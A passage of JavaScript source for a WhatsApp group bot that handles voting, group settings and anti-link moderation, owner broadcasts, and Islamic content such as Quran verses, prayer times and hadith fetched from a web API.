              {buttonId: `${prefix}devote`, buttonText: {displayText: '👎🏻De-Vote👎🏻'}, type: 1}
            ]

            let buttonMessageUpvote = {
                text: teks_vote,
                footer:  `${global.fake}`,
                buttons: buttonsUpvote,
                headerType: 1,
                mentions: menvote
             }
            XeonBotInc.sendMessage(m.chat, buttonMessageUpvote)
	    }
             break
                case '7devote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*no voting in this group!*_\n\n*${prefix}vote* - untuk memulai voting`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'You Have Voted'
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 
└────

┌〔 DEVOTE 〕
 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 
└────

*${prefix}hapusvote* - untuk menghapus votes`
            let buttonsDevote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '👍🏻Up-Vote??🏻'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '👎🏻De-Vote👎🏻'}, type: 1}
            ]

            let buttonMessageDevote = {
                text: teks_vote,
                footer:  `${global.fake}`,
                buttons: buttonsDevote,
                headerType: 1,
                mentions: menvote
            }
            XeonBotInc.sendMessage(m.chat, buttonMessageDevote)
	}
            break
                 
case '7cekvote':
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*no voting in this group!*_\n\n*${prefix}vote* - untuk memulai voting`
teks_vote = `*「 VOTE 」*

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 
└────

┌〔 DEVOTE 〕
 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 
└────

*${prefix}hapusvote* - untuk menghapus votes


©${XeonBotInc.user.id}
`
XeonBotInc.sendTextWithMentions(m.chat, teks_vote, m)
break
		case '7deletevote': case '7delvote': case '7hapusvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai voting`
            delete vote[m.chat]
            reply('Successfully Deleted Vote Session In This Group')
	    }
            break
case 'groupsystem': case 'groupsetting': case 'groupset': {
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                listMessage :{
                    title: `Hai ${pushname}`,
                    description: `Group chat system & setting`,
                    buttonText: "𝗖𝗟𝗜𝗖𝗞 𝗠𝗘",
                    footerText: `_${global.botnma}_`,
                    listType: "SINGLE_SELECT",
                    sections: [{
								"title": "Pilih menu di bawah ini",
								"rows": [
									{
										"title": "Group ⭕Open⭕ ",
										"description": `Mengizinkan semua member mengirim pesan di group`,
										"rowId": `${prefix}groupopen open`
									},
									{
										"title": "Group 🚫Close🚫",
										"description": `Hanya admin yang dapat mengirim pesan di group`,
										"rowId": `${prefix}groupopen close`
									},
									{
										"title": "Antilink GC ❗ON❗",
										"description": `Member yang ngirim link group wa lain, auto di kick`,
										"rowId": `${prefix}antilink on`
									},
									{
										"title": "Antilink GC 🆓OFF🆓",
										"description": `Member bebas share link group lain`,
										"rowId": `${prefix}antilink off`
									},
										{
											"title": "Anti wa.me ❗ON❗",
										"description": `Yang ngirim link wa.me/ auto di kick`,
										"rowId": `${prefix}antiwame on`
										},
										{
											"title": "Anti wa.me 🆓OFF🆓",
										"description": `Bebas kirim link wa.me/`,
										"rowId": `${prefix}antiwame off`
										},
										{
											"title": "Mute 🔇ON🔇",
										"description": `Bot tidak akan merespon di group ini`,
										"rowId": `${prefix}mute on`
										},
										{
											"title": "Mute 🔊OFF🔊",
										"description": `Bot akan kembali merespon di group ini`,
										"rowId": `${prefix}mute off`
										},
										{
											"title": "Edit Info ⭕ON⭕",
										"description": `Semua perseta dapat merubah info group`,
										"rowId": `${prefix}editinfo open`
										},
										{
											"title": "Edit Info 🚫OFF🚫",
										"description": `Hanya admin yang dapat merubah info group`,
										"rowId": `${prefix}editinfo close`
										},
										{
											"title": "Antivirtex ⭕ON⭕",
										"description": `Member yang mengirim pesan lebih dari 15k karakter akan di kick`,
										"rowId": `${prefix}antivirtex on`
										},
										{
											"title": "Antivirtex 🚫OFF🚫",
										"description": `Anti virtex di matikan`,
										"rowId": `${prefix}antivirtex off`
										}
								]
							}
						],
          listType: 1
                }
            }), {})
            XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
               case 'groupopen': case 'grupopen': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === 'close'){
                    await XeonBotInc.groupSettingUpdate(m.chat, 'announcement').then((res) => reply(`Successful Closing The Group`)).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'open'){
                    await XeonBotInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => reply(`Successful Opening The Group`)).catch((err) => reply(jsonformat(err)))
                } else {
                let buttons = [
                        { buttonId: '.group open', buttonText: { displayText: '⭕Open⭕' }, type: 1 },
                        { buttonId: '.group close', buttonText: { displayText: '🚫Close🚫' }, type: 1 }
                    ]
                    await XeonBotInc.sendButtonText(m.chat, buttons, `Group Mode`,  `${global.fake}`, m)

             }
            }
            break
            case 'editinfo': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
             if (args[0] === 'open'){
                await XeonBotInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => reply(`Successfully Opened Edit Group Info`)).catch((err) => reply(jsonformat(err)))
             } else if (args[0] === 'close'){
                await XeonBotInc.groupSettingUpdate(m.chat, 'locked').then((res) => reply(`Successfully Close Edit Group Info`)).catch((err) => reply(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: '.editinfo open', buttonText: { displayText: '⭕Open⭕' }, type: 1 },
                        { buttonId: '.editinfo close', buttonText: { displayText: '🚫Close🚫' }, type: 1 }
                    ]
                    await XeonBotInc.sendButtonText(m.chat, buttons, `Mode Edit Info`,  `${global.fake}`, m)

            }
            }
            break
case 'antilink':
	        if (!m.isGroup) return reply(`This feature only be used in group`)
			if (!isAdmins) return reply(`This feature could be used by admin only`)
			if (!isBotAdmins) return reply(`Bot must be admin first`)
					if (args[0] === 'off') {
						if (isAntiLink) return reply('Already Deactivated') 
						antilink.push(m.chat)
						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
						reply('Successfully disabled antilink feature')
						
					} else if (args[0] === 'on') {
						if (!isAntiLink) return reply('Already Activated')
						var ini = antilink.indexOf(m.chat)
						antilink.splice(ini, 1)
						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
						reply('Successfully activated the antilink feature')
						XeonBotInc.sendMessage(m.chat,  {text: `ALLERT!!! This group has been installed anti-link\nIf you violate then I will kick`})
					} else if (!q){
 let buttons = [
                     {buttonId: `${prefix + command} on`, buttonText: {displayText: 'ON❗'}, type: 1},
{buttonId: `${prefix + command} off`, buttonText: {displayText: 'OFF🚫'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: 'Pilih anti link group WhatsApp on/off' ,
                    footer: `Klik on untuk mengaktifkan\nKlik off untuk mematikan`,
                    buttons: buttons,
                    headerType: 2
                }
            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
					break 
					case 'antiwame':
	        if (!m.isGroup) return reply(`This feature only be used in group`)
			if (!isAdmins) return reply(`This feature could be used by admin only`)
			if (!isBotAdmins) return reply(`Bot must be admin first`)
					if (args[0] === 'on') {
						if (isAntiWame) return reply('Already Activated')
						antiwame.push(m.chat)
						fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame))
						reply('Successfully activated the anti wa.me feature')
						XeonBotInc.sendMessage(m.chat,  {text: `ALLERT!!! This group has been installed anti-link\nIf you violate then I will kick`})
					} else if (args[0] === 'off') {
						if (!isAntiWame) return reply('Already Deactivated')
						var ini = antiwame.indexOf(m.chat)
						antiwame.splice(ini, 1)
						fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame))
						reply('Successfully disabled anti wa.me  feature')
					} else if (!q){
						let buttons = [
                     {buttonId: `${prefix + command} on`, buttonText: {displayText: 'ON❗'}, type: 1},
{buttonId: `${prefix + command} off`, buttonText: {displayText: 'OFF🚫'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: 'Pilih anti wa.me on/off' ,
                    footer: `Klik on untuk mengaktifkan\nKlik off untuk mematikan`,
                    buttons: buttons,
                    headerType: 2
                }
            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
					break 
					case 'antivirtex':
	        if (!m.isGroup) return reply(`This feature only be used in group`)
			if (!isAdmins) return reply(`This feature could be used by admin only`)
			if (!isBotAdmins) return reply(`Bot must be admin first`)
					if (args[0] === 'off') {
						if (isAntiVirtex) return reply('Already Deactivated')
						antivirtex.push(m.chat)
						fs.writeFileSync('./database/antivirtex.json', JSON.stringify(antivirtex))
						reply('Successfully disabel the antivirtex feature')
						//XeonBotInc.sendMessage(m.chat,  {text: `ALLERT!!! This group has been installed anti-link\nIf you violate then I will kick`})
					} else if (args[0] === 'on') {
						if (!isAntiVirtex) return reply('Already Activated')
						var ini = antivirtex.indexOf(m.chat)
						antivirtex.splice(ini, 1)
						fs.writeFileSync('./database/antivirtex.json', JSON.stringify(antivirtex))
						reply('Successfully activated the antivirtex feature')
					} else if (!q){
 let buttons = [
                     {buttonId: `${prefix + command} on`, buttonText: {displayText: 'ON❗'}, type: 1},
{buttonId: `${prefix + command} off`, buttonText: {displayText: 'OFF🚫'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: 'Pilih anti Virtek on/off' ,
                    footer: `Klik on untuk mengaktifkan\nKlik off untuk mematikan`,
                    buttons: buttons,
                    headerType: 2
                }
            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
					break 
					
					   case '7mute': {
                if (!m.isGroup) throw mess.group
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.chats[m.chat].mute) return reply(`Already activated`)
                db.chats[m.chat].mute = true
                reply(`${ `${global.botnma}`} has been muted in this group !`)
                } else if (args[0] === "off") {
                if (!db.chats[m.chat].mute) return reply(`Already deactivated`)
                db.chats[m.chat].mute = false
                reply(`${ `${global.botnma}`} has been unmuted in this group!`)
                } else {
                 let buttons = [
                        { buttonId: '.mute on', buttonText: { displayText: '⭕On⭕' }, type: 1 },
                        { buttonId: '.mute off', buttonText: { displayText: '❌Off❌' }, type: 1 }
                    ]
                    await XeonBotInc.sendButtonText(m.chat, buttons, `Mute Bot`,  `${global.fake}`, m)
                }
             }
             break
            case 'linkgroup': case '7grouplink': case '7gclink': case '7linkgc': {            
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) return reply(`Bot must be admin first`)
                let response = await XeonBotInc.groupInviteCode(m.chat)
                XeonBotInc.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink of: ${groupMetadata.subject} Group`, m, { detectLink: true })
            }
            break
            case '7ephemeral': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Enter the enable/disable value, For Example ${prefix}ephemeral enable'
                if (args[0] === 'enable') {
                    await XeonBotInc.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'disable') {
                    await XeonBotInc.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                }
            }
            break
            case 'delete': case 'del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) throw 'The message was not sent by a bot!'
                XeonBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            
            break

            case 'bcgc': case 'bcgroup': {
                if (!isCreator) throw mess.owner
                if (!text) throw `*Mana teks nya?*\n\_Contoh:_ ${prefix + command} Hello guys im WhatsApp bot in here`
                let getGroups = await XeonBotInc.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                reply(`Send Broadcast To ${anu.length} Group Chat, Finish Time ${anu.length * 1.5} second`)
                for (let i of anu) {
                    await sleep(1500)
                    let btn = [{
                                urlButton: {
                                    displayText: `${global.medsos1}📍`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                callButton: {
                                    displayText: 'Owner Number👤',
                                    phoneNumber: `${global.pemilik}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '📶Bot Status📶',
                                    id: `${prefix}ping`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '👤Owner👤',
                                    id: `${prefix}owner`
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: '</Menu>',
                                    id: `${prefix}menu`
                                }
                            }]
                      fatihgans = fs.readFileSync('./BotMedia/bcgc.jpg')
                      let txt = `「 ${global.botnma} Broadcast 」\n\n${text}`
                      XeonBotInc.send5ButImg(i, txt,  `${global.fake}`, fatihgans, btn)
                    }
                reply(`Successful Sending Broadcast To ${anu.length} Group(s)`)
            }
            break
            case '7bc': case '7broadcast': case '7bcall': {
                if (!isCreator) throw mess.owner
                if (!text) throw `*Mana teks nya?*\n\_Contoh:_ ${prefix + command} Hello guys im WhatsApp bot in here`
                let anu = await store.chats.all().map(v => v.id)
                reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} second`)
		for (let yoi of anu) {
		    await sleep(1500)
		                      let btn = [{
                                urlButton: {
                                    displayText: `${global.medsos1}📍`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                callButton: {
                                    displayText: 'Owner Number👤',
                                    phoneNumber: `${global.pemilik}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '📶Bot Status📶',
                                    id: `${prefix}ping`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '👤Owner👤',
                                    id: `${prefix}owner`
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: '</Menu>',
                                    id: `${prefix}menu`
                                }
                            }]
                      fatihgans = fs.readFileSync('./BotMedia/bc.jpg')
                      let txt = `「 ${global.botnma} Broadcast 」\n\n${text}`
                      XeonBotInc.send5ButImg(yoi, txt, `Broadcast By ${global.ownernma}`, fatihgans, btn)
		}
		reply('Broadcast Success')
            }
            break

            case '7chatinfo': {
                if (!m.quoted) reply('Reply to mesaage')
                let msg = await m.getQuotedObj()
                if (!m.quoted.isBaileys) throw 'The message was not sent by a bot!'
                let teks = ''
                for (let i of msg.userReceipt) {
                    let read = i.readTimestamp
                    let unread = i.receiptTimestamp
                    let waktu = read ? read : unread
                    teks += `⭔ @${i.userJid.split('@')[0]}\n`
                    teks += ` ┗━⭔ *Time :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ⭔ *Status :* ${read ? 'Read' : 'Unread'}\n\n`
                }
                XeonBotInc.sendTextWithMentions(m.chat, teks, m)
            }
            break
            case '7q': case '7quoted': {
		if (!m.quoted) return reply('Reply Message!!')
		let wokwol = await XeonBotInc.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return reply('The message you replied to does not contain a reply')
		await wokwol.quoted.copyNForward(m.chat, true)
            }
	    break
            case '7listpc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `⬣ *PERSONAL CHAT LIST*\n\nTotal Chat : ${anu.length} Chat\n\n`
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `⬡ *Name :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 XeonBotInc.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case '7listgc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `⬣ *GROUP CHAT LIST*\n\nTotal Group : ${anu.length} Group\n\n`
                 for (let i of anu) {
                     let metadata = await XeonBotInc.groupMetadata(i)
                     teks += `⬡ *Name :* ${metadata.subject}\n⬡ *Owner :* @${metadata.owner.split('@')[0]}\n⬡ *ID :* ${metadata.id}\n⬡ *Made :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 XeonBotInc.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case '7listonline': case '7onlinelist': case '7liston': {
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    XeonBotInc.sendText(m.chat, 'Online List:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
//[ Islam MENU]\\ apikey lolhuman
         case '7listsurah': case '7listsurat': case '7surahlist':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/quran?apikey=${global.apilol}`)
                    get_result = get_result.result
                    ini_txt = 'List Surah:\n'
                    for (var x in get_result) {
                        ini_txt += `${x}. ${get_result[x]}\n`
                    }
                    m.reply(ini_txt)
                    break                                
case '7alquran': {
let buttons = [
                     {buttonId: `${prefix}listsurah`, buttonText: {displayText: '📋LIST NOMOR SURAH📋'}, type: 1}             
                ]
                let buttonMessage = {
                    text: `*Masukan NomorSurah/NomorAyat*\n_Contoh :_\n${prefix + command} 9\n${prefix + command} 9/128\n${prefix + command} 9/128-129`,
                    footer: `Tombol untuk melihat list nomor surah`,
                    buttons: buttons,
                    headerType: 2
                }
                if (args.length < 1) {
            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
//throw `*Masukan nomor surah/nomor ayat*\n_Contoh :_ ${prefix + command} madiun`
                //    if (args.length < 1) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
                  } else {
                  urls = `http://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${global.apilol}`
                    quran = await fetchJson(urls)
                    result = quran.result
                    ayat = result.ayat
                    ini_txt = `QS. ${result.surah} : 1-${ayat.length}\n\n`
                    for (var x of ayat) {
                        arab = x.arab
                        nomor = x.ayat
                        latin = x.latin
                        indo = x.indonesia
                        ini_txt += `${arab}\n${nomor}. ${latin}\n${indo}\n\n`
                    }
                    ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
                    ini_txt = ini_txt.replace(/<strong>/g, "").replace(/<\/strong>/g, "")
                    ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
                    replay(ini_txt)
                    }
                    }
                    break
case '7alquranmp3': case '7alquranaudio': {
	let buttons = [
                     {buttonId: `${prefix}listsurah`, buttonText: {displayText: '📋LIST NOMOR SURAH📋'}, type: 1}             
                ]
                let buttonMessage = {
                    text: `*Masukan NomorSurah/NomorAyat*\n_Contoh :_\n${prefix + command} 9\n${prefix + command} 9/128`,
                    footer: `Tombol untuk melihat list nomor surah`,
                    buttons: buttons,
                    headerType: 2
                }
                if (args.length < 1) {
            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
	} else {
		m.reply(mess.wait)
		links = `https://api.lolhuman.xyz/api/quran/audio/${text}?apikey=${global.apilol}`
XeonBotInc.sendMessage(m.chat, { audio: { url : links }, mimetype: 'audio/mpeg'}, { quoted: m })
}
}
break
case '7surahmp3': case '7surahaudio': {
	let buttons = [
                     {buttonId: `${prefix}listsurah`, buttonText: {displayText: '📋LIST NOMOR SURAH📋'}, type: 1}             
                ]
                let buttonMessage = {
                    text: `*Masukan NomorSurah*\n_Contoh :_\n${prefix + command} 1`,
                    footer: `Tombol untuk melihat list nomor surah`,
                    buttons: buttons,
                    headerType: 2
                }
                if (args.length < 1) {
            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
	} else {
		m.reply(mess.wait)
		links = `https://api.lolhuman.xyz/api/quran/audio/${text}?apikey=${global.apilol}`
XeonBotInc.sendMessage(m.chat, { audio: { url : links }, mimetype: 'audio/mpeg'}, { quoted: m })
}
}
break
case '7ayatmp3': case '7ayataudio': {
	let buttons = [
                     {buttonId: `${prefix}listsurah`, buttonText: {displayText: '📋LIST NOMOR SURAH📋'}, type: 1}             
                ]
                let buttonMessage = {
                    text: `*Masukan NomorSurah/NomorAyat*\n_Contoh :_\n${prefix + command} 2/255`,
                    footer: `Tombol untuk melihat list nomor surah`,
                    buttons: buttons,
                    headerType: 2
                }
                if (args.length < 1) {
            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
	} else {
		m.reply(mess.wait)
		links = `https://api.lolhuman.xyz/api/quran/audio/${text}?apikey=${global.apilol}`
XeonBotInc.sendMessage(m.chat, { audio: { url : links }, mimetype: 'audio/mpeg'}, { quoted: m })
}
}
break

         case '7jadwalsholat':
                    if (!text) throw `*Masukan nama kabupaten/kota?*\n_Contoh :_ ${prefix + command} madiun`
                    daerah = args.join(" ")
get_result = await fetchJson(`http://api.lolhuman.xyz/api/sholat/${daerah}?apikey=${global.apilol}`)
                    get_result = get_result.result
                    ini_txt = `Wilayah : ${get_result.wilayah}\n`
                    ini_txt += `Tanggal : ${get_result.tanggal}\n`
                    ini_txt += `Sahur : ${get_result.sahur}\n`
                    ini_txt += `Imsak : ${get_result.imsak}\n`
                    ini_txt += `Subuh : ${get_result.subuh}\n`
                    ini_txt += `Terbit : ${get_result.terbit}\n`
                    ini_txt += `Dhuha : ${get_result.dhuha}\n`
                    ini_txt += `Dzuhur : ${get_result.dzuhur}\n`
                    ini_txt += `Ashar : ${get_result.ashar}\n`
                    ini_txt += `Maghrib : ${get_result.maghrib}\n`
                    ini_txt += `Isya : ${get_result.isya}`
                    replay(ini_txt)
                    break  
                    
             case '7hadits': case '7hadith': case '7hadist': {
		if (!args[0]) throw `*Masukan hadist NomorHadits*
_Contoh:_
${prefix + command} bukhari 1
${prefix + command} abu-daud 1567

Opsi tersedia:
abu-daud
1 - 4590

ahmad
1 - 26363

bukhari
1 - 7008

darimi
1 - 3367

ibu-majah
1 - 4331

nasai
1 - 5662

malik
1 - 1594

muslim
1 - 5362`
		if (!args[1]) throw `*Masukan hadist NomorHadits*
_Contoh:_
${prefix + command} bukhari 1
${prefix + command} abu-daud 1567

Opsi tersedia:
abu-daud
1 - 4590

ahmad
1 - 26363

bukhari
1 - 7008

darimi
1 - 3367

ibu-majah
1 - 4331

nasai
1 - 5662

malik
1 - 1594

muslim
1 - 5362`
		try {
			m.reply(mess.wait)
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
		let { number, arab, id } = res.find(v => v.number == args[1])
replay(`No. ${number}

${arab}

${id}`)
		} catch (e) {
		reply(`Hadith not found !`)
		}
		}
		break
case '7niatsholat': case '7niatshalat': case '7niatsalat': case '7sholatniat': {
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                listMessage :{
                    title: `Hai ${pushname}`,
                    description: `Niat Shalat wajib 5 waktu`,
                    buttonText: "𝗖𝗟𝗜𝗖𝗞 𝗠𝗘",
                    footerText: `_${global.botnma}_`,
                    listType: "SINGLE_SELECT",
                    sections: [{
								"title": "Niat Shalat Wajib 5 Waktu",
								"rows": [
									{
										"title": "Niat Sholat Subuh",
										"description": `Bacaan niat shalat wajib subuh`,
										"rowId": `${prefix}niat2 subuh`
									},
									{
										"title": "Niat Sholat Dzuhur",
										"description": `Bacaan niat shalat wajib dzuhur`,
										"rowId": `${prefix}niat2 dzuhur`
									},
									{
										"title": "Niat Sholat Ashar",
										"description": `Bacaan niat shalat wajib ashar`,
										"rowId": `${prefix}niat2 ashar`
									},
										{
											"title": "Niat Sholat Maghrib",
										"description": `Bacaan niat shalat wajib maghrib`,
										"rowId": `${prefix}maghrib`
										},
										{
											"title": "Niat Sholat Isya",
										"description": `Bacaan niat shalat wajib isya`,
										"rowId": `${prefix}niat2 isya`
									}
								]
							}
						],
          listType: 1
                }
            }), {})
            XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
        case '7niat2': {
        if (!text) throw `*Niat shalat apa?*\n_Contoh :_ ${prefix + command} subuh`
        	let res = await fetchJson(`https://api.lolhuman.xyz/api/niatsholat/${text}?apikey=${global.apilol}`)
        replay(`*〔 ${res.result.name} 〕*
${res.result.ar}

${res.result.latin}

${res.result.id}`)
}
break
case '7maghrib': {
        	
        replay(`*〔 Niat Sholat Maghrib 〕*
أُصَلِّى فَرْضَ المَغْرِبِ ثَلاَثَ رَكَعاَتٍ مُسْتَقْبِلَ الْقِبْلَةِ أَدَاءً لله تَعَالَى.

Ushallii fardhal maghribi tsalaatsa raka’aatin mustaqbilal qiblati adaa’an lilaahi ta’aalaa.

"Saya (berniat) mengerjakan sholat fardhu maghrib tiga raka’at dengan menghadap kiblat karena Allah Ta’ala."`)
}
break
case '7asmaulhusna': {
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${global.apilol}`)
     let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1},
                     {buttonId: `${prefix}copy *〔 Random Nama-Nama Baik ALLAH 〕*
                    
⭔ Latin : ${anu.result.latin}
⭔ Arab : ${anu.result.ar}
⭔ ID : ${anu.result.id}
⭔ en : ${anu.result.en}
⭔ No : ${anu.result.index}`, buttonText: {displayText: `📄COPY TEKS📄`}, type: 1}
                ]
                let buttonMessage = {
                    text: `*〔 Random Nama-Nama Baik ALLAH 〕*
                    
⭔ Latin : ${anu.result.latin}
⭔ Arab : ${anu.result.ar}
⭔ ID : ${anu.result.id}
⭔ en : ${anu.result.en}
⭔ No : ${anu.result.index}`,
                    footer: `Asmaulhusna`,
                    buttons: buttons,
                    headerType: 2
                }
            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '7kisah2': case '7kisahnabi2': {
                if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
                    query = args.join(" ")
                    getresult = await fetchJson(`http://api.lolhuman.xyz/api/kisahnabi/${query}?apikey=${global.apilol}`)
                    get_result = getresult.result
                ini_txt = `Name : ${get_result.name}\n`
                    ini_txt += `Lahir : ${get_result.thn_kelahiran}\n`
               ini_txt += `Umur : ${get_result.age}\n`
                  ini_txt += `Tempat : ${get_result.place}\n`
                  ini_txt += `Story : \n${get_result.story}`
                    replay(ini_txt)
                    }
                    break
case '7kisahnabi': case '7kisahrasul': case '7rasulkisah': case '7nabikisah': {
	//if (!text) throw `*Masukan Teks*\n_Contoh:_ ${prefix + command} dasar anak tiktok suka pargoy di tempat umum`
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                listMessage :{
                    title: `Hai ${pushname}`,
                    description: `Berikut list 25 Nabi dan Rasul`,
                    buttonText: "𝗖𝗟𝗜𝗖𝗞 𝗠𝗘",
                    footerText: `_pilih untuk melihat kisahnya_`,
                    listType: "SINGLE_SELECT",
                    sections: [{
								"title": "25 Nabi dan Rasul yang wajib diketahui",
								"rows": [
									{
										"title": "Nabi Adam As",
										"description": `Nabi Adam As merupakan manusia serta khalifah pertama yang diciptakan Allah SWT dari segumpal tanah.`,
										"rowId": `${prefix}kisah2 adam`
									},
									{
										"title": "Nabi Idris AS",
										"description": `Beliau merupakan Nabi pertama yang diangkat Allah dari garis keturunan Nabi Adam As.`,
										"rowId": `${prefix}kisah2 idris`
									},
									{
										"title": "Nabi Nuh AS",
										"description": `Mukjizat Nabi Nuh As satu di antaranya membuat bahtera besar, untuk menyelamatkan kaumnya dan binatang dari banjir bandang.`,
										"rowId": `${prefix}kisah2 nuh`
									},
									{
										"title": "Nabi Hud AS",
										"description": `Beliau diutus untuk mengajak kaum Aad berhenti menyembah berhala. Nabi Hud mengajak kaum Aad untuk menyembah kepada Allah.`,
										"rowId": `${prefix}kisah2 hud`
									},
									{
										"title": "Nabi Sholeh AS",
										"description": `Mukjizat yang diberikan Allah oleh Nabi Sholeh As, yakni seekor unta betina yang lahir dari celah-celah batu.`,
										"rowId": `${prefix}kisah2 sholeh`
									},
									{
										"title": "Nabi Ibrahim AS",
										"description": `Nabi Ibrahim atau "Bapak para nabi" memiliki satu di antara mukjizat dari Allah SWT untuk membangun Ka'bah.`,
										"rowId": `${prefix}kisah2 ibrahim`
									},
									{
										"title": "Nabi Luth AS",
										"description": `Nabi Luth As merupakan keponakan Nabi Ibrahim As. Beliau diutus Allah bagi kaum Sodom dan Gomorrah yang memiliki perilaku seks menyimpang.`,
										"rowId": `${prefix}kisah2 Luth`
									},
									{
										"title": "Nabi Ismail AS",
										"description": `Beliau merupakan putra dari Nabi Ibrahim dan Siti Hajar. Beliau bersama-sama membangun Ka’bah dengan ayahnya yang saat ini menjadi pusat peribadatan kaum Muslim di seluruh dunia.`,
										"rowId": `${prefix}kisah2 Ismail`
									},
									{
										"title": "Nabi Ishaq AS",
										"description": `Nabi Ishaq merupakan putra kedua dari Nabi Ibrahim As dan beliau merupakan adik Nabi Ismail As.`,
										"rowId": `${prefix}kisah2 ishak`
									},
									{
